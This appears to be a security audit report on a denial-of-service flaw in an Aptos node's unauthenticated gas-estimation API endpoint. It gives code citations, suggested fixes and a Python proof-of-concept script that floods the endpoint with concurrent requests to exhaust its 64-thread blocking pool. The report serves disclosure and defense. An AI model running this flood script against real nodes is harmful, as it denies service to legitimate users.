# Audit Report

## Title
Unauthenticated API Flooding Enables Blocking Thread Pool Exhaustion via Gas Estimation Endpoint

## Summary
The `/estimate_gas_price` endpoint allows unauthenticated users to trigger expensive database operations that exhaust the limited blocking thread pool (64 threads), causing API-wide denial of service. The endpoint lacks per-request rate limiting and holds a write lock during multi-second database reads, enabling attackers to monopolize all blocking threads and starve other API operations.

## Finding Description

The gas estimation endpoint exposes a critical resource exhaustion vulnerability through several design issues:

**1. Unauthenticated Public Access**

The endpoint is publicly accessible without authentication: [1](#0-0) 

**2. Short Cache Expiration with Expensive Recalculation**

The cache expires after only 500ms by default: [2](#0-1) 

When cache expires, recalculation requires reading up to 120 blocks from the database: [3](#0-2) 

**3. Write Lock Held During Expensive Database Operations**

The critical vulnerability is that the write lock is acquired before database operations and held throughout: [4](#0-3) 

This lock remains held during block reads: [5](#0-4) 

And during transaction iteration for each block: [6](#0-5) 

**4. Limited Blocking Thread Pool**

The API runtime uses a severely constrained blocking thread pool: [7](#0-6) 

Every request spawns a blocking task: [8](#0-7) 

**5. No Per-Endpoint Rate Limiting**

HAProxy configuration shows no request-level rate limiting for the API frontend: [9](#0-8) 

**Attack Execution:**

1. Attacker waits for cache expiration (every 500ms)
2. Sends burst of 64+ concurrent GET requests to `/estimate_gas_price`
3. All requests spawn blocking tasks via `api_spawn_blocking`
4. All tasks see expired cache (with read lock), then compete for write lock
5. One task acquires write lock and begins 1-2 second database read of 120 blocks
6. Remaining 63+ tasks block waiting for write lock, occupying blocking threads
7. Attacker repeats every 500ms, maintaining 64 blocking threads in waiting state
8. All 64 blocking threads exhausted
9. Other API endpoints requiring `api_spawn_blocking` cannot execute
10. API becomes completely unresponsive to legitimate users

## Impact Explanation

**Severity: Medium** (per Aptos Bug Bounty criteria)

This vulnerability causes:
- **API Denial of Service**: Complete API unresponsiveness under sustained attack
- **Resource Exhaustion**: All 64 blocking threads monopolized by waiting tasks
- **Cascading Failures**: Other endpoints using `api_spawn_blocking` (accounts, state, transactions, blocks, events, view functions) become unavailable

The attack does not:
- Affect consensus or validator operations
- Corrupt blockchain state
- Enable fund theft
- Require privileged access

This falls under "State inconsistencies requiring intervention" (Medium) as the API becomes unavailable and requires operator intervention to mitigate.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- No authentication required
- Simple HTTP GET requests
- No special parameters needed
- Attack can be automated with basic HTTP client
- Cache expiration is predictable (every 500ms)
- Thread pool limit is low (64 threads)

Detection may be delayed as the attack mimics legitimate traffic patterns.

## Recommendation

Implement multi-layered defenses:

**1. Add Per-Endpoint Rate Limiting**

Implement request-level rate limiting middleware using the existing `aptos-rate-limiter`:

```rust
// In api/src/runtime.rs, add rate limiting middleware
use aptos_rate_limiter::rate_limit::TokenBucketRateLimiter;

// Configure per-IP rate limiting for gas estimation endpoint
// Example: 10 requests per second per IP
```

**2. Release Write Lock Before Database Operations**

Restructure `estimate_gas_price` to:
- Acquire write lock only for cache updates
- Perform database reads without holding locks
- Use atomic operations or double-check after acquiring lock for updates

**3. Increase Cache Duration**

Change default `cache_expiration_ms` from 500ms to 5000ms (5 seconds) to reduce recalculation frequency while maintaining reasonable freshness.

**4. Implement Request Coalescing**

Track in-flight recalculations and coalesce concurrent requests to share the result of a single recalculation.

**5. Add HAProxy Request Rate Limiting**

```haproxy
# In haproxy-fullnode.cfg frontend section
stick-table type ip size 100k expire 60s store http_req_rate(10s)
http-request track-sc0 src
http-request deny deny_status 429 if { sc_http_req_rate(0) gt 100 }
```

## Proof of Concept

```python
#!/usr/bin/env python3
import requests
import threading
import time

# Target API endpoint
API_URL = "http://localhost:8080/v1/estimate_gas_price"

def flood_endpoint():
    """Send request to gas estimation endpoint"""
    try:
        response = requests.get(API_URL, timeout=10)
        print(f"[{threading.current_thread().name}] Status: {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"[{threading.current_thread().name}] TIMEOUT - API unresponsive!")
    except Exception as e:
        print(f"[{threading.current_thread().name}] ERROR: {e}")

def attack():
    """Execute thread pool exhaustion attack"""
    print("[*] Starting blocking thread pool exhaustion attack...")
    print("[*] Sending 70 concurrent requests every 500ms...")
    
    attack_round = 0
    while True:
        attack_round += 1
        print(f"\n[*] Attack Round {attack_round}")
        
        # Send burst of 70 concurrent requests (exceeds 64 thread pool limit)
        threads = []
        for i in range(70):
            t = threading.Thread(target=flood_endpoint, name=f"Attacker-{i}")
            threads.append(t)
            t.start()
        
        # Wait for threads to complete
        for t in threads:
            t.join(timeout=5)
        
        # Wait for cache to expire before next burst
        time.sleep(0.5)

if __name__ == "__main__":
    print("[*] Gas Estimation API DoS Proof of Concept")
    print("[*] Target: " + API_URL)
    print("[*] This will exhaust the blocking thread pool (64 threads)")
    print("[*] Other API endpoints will become unresponsive")
    print()
    
    # Test endpoint availability first
    try:
        response = requests.get(API_URL, timeout=5)
        print(f"[+] Endpoint accessible, status: {response.status_code}")
    except Exception as e:
        print(f"[-] Cannot reach endpoint: {e}")
        exit(1)
    
    # Execute attack
    try:
        attack()
    except KeyboardInterrupt:
        print("\n[*] Attack stopped by user")
```

**Expected Behavior:**
- Initial requests succeed quickly (cache hit)
- After 500ms, burst of 70 requests exhausts thread pool
- Subsequent requests timeout as blocking threads are occupied
- Other API endpoints (e.g., `/accounts`, `/transactions`) also timeout
- API remains unresponsive until attack stops and threads drain

## Notes

The vulnerability is amplified by several factors working together:
1. The comment in the code explicitly acknowledges this is a known performance concern but implements the expensive approach anyway
2. The double-checked locking pattern prevents multiple concurrent recalculations but still blocks all waiting threads
3. The blocking thread pool limit of 64 is deliberately set to prevent "too many Rest API calls overwhelming the node" but this protection fails when a single endpoint can monopolize all threads

The fix requires coordinated changes across rate limiting, cache design, and lock granularity to properly protect against this attack vector.

### Citations

**File:** api/src/transactions.rs (L811-817)
```rust
    #[oai(
        path = "/estimate_gas_price",
        method = "get",
        operation_id = "estimate_gas_price",
        tag = "ApiTags::Transactions"
    )]
    async fn estimate_gas_price(&self, accept_type: AcceptType) -> BasicResult<GasEstimation> {
```

**File:** api/src/transactions.rs (L823-826)
```rust
        api_spawn_blocking(move || {
            let latest_ledger_info = context.get_latest_ledger_info()?;
            let gas_estimation = context.estimate_gas_price(&latest_ledger_info)?;
            Self::log_gas_estimation(&gas_estimation);
```

**File:** config/src/config/gas_estimation_config.rs (L46-46)
```rust
            aggressive_block_history: 120,
```

**File:** config/src/config/gas_estimation_config.rs (L47-47)
```rust
            cache_expiration_ms: 500,
```

**File:** api/src/context.rs (L1313-1313)
```rust
        let mut cache = self.gas_estimation_cache.write().unwrap();
```

**File:** api/src/context.rs (L1326-1359)
```rust
        // 1. Get the block metadata txns
        let mut lookup_version = ledger_info.ledger_version.0;
        let mut blocks = vec![];
        // Skip the first block, which may be partial
        if let Ok((first, _, block)) = self.db.get_block_info_by_version(lookup_version) {
            if block.epoch() == epoch {
                lookup_version = first.saturating_sub(1);
            }
        }
        let mut cached_blocks_hit = false;
        for _i in 0..max_block_history {
            if cache
                .min_inclusion_prices
                .contains_key(&(epoch, lookup_version))
            {
                cached_blocks_hit = true;
                break;
            }
            match self.db.get_block_info_by_version(lookup_version) {
                Ok((first, last, block)) => {
                    if block.epoch() != epoch {
                        break;
                    }
                    lookup_version = first.saturating_sub(1);
                    blocks.push((first, last));
                    if lookup_version == 0 {
                        break;
                    }
                },
                Err(_) => {
                    break;
                },
            }
        }
```

**File:** api/src/context.rs (L1371-1378)
```rust
        for (first, last) in blocks {
            let min_inclusion_price = self
                .block_min_inclusion_price(ledger_info, first, last, config, &execution_config)
                .unwrap_or(min_gas_unit_price);
            min_inclusion_prices.push(min_inclusion_price);
            cache
                .min_inclusion_prices
                .insert((epoch, last), min_inclusion_price);
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** docker/compose/aptos-node/haproxy-fullnode.cfg (L98-109)
```text
## Specify the API frontend
frontend fullnode-api
    mode http
    option httplog
    bind :8080
    default_backend fullnode-api

    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }

    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"
```
